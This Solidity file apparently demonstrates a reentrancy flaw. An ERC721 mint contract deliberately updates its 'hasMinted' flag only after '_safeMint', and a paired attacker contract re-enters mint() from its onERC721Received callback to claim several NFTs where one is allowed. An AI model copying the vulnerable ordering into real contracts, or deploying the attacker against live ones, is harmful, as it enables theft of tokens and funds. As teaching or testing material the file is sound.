// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// A contract that gives out 1 NFT to each address claiming.
contract ERC721ReentrancyVulnerable is ERC721 {
    constructor() ERC721("NFT Collection", "NFT") {}

    uint256 tokenId;

    mapping(address => bool) public hasMinted;

    function mint() public {
        require(!hasMinted[msg.sender], "This address has already minted a token");

        tokenId++;
        _safeMint(msg.sender, tokenId);

        hasMinted[msg.sender] = true;
    }
}

contract ERC721ReentrancyAttacker {
    ERC721ReentrancyVulnerable vulnerable;

    uint256 tokensToMint = 10;

    constructor(ERC721ReentrancyVulnerable _vulnerable) {
        vulnerable = _vulnerable;
    }

    // Reentrancy attack.
    function attack() public payable {
        tokensToMint--;
        vulnerable.mint();
    }

    // Callback function to receive NFTs.
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (tokensToMint > 0) {
            tokensToMint--;
            vulnerable.mint();
        }
        return this.onERC721Received.selector;
    }
}
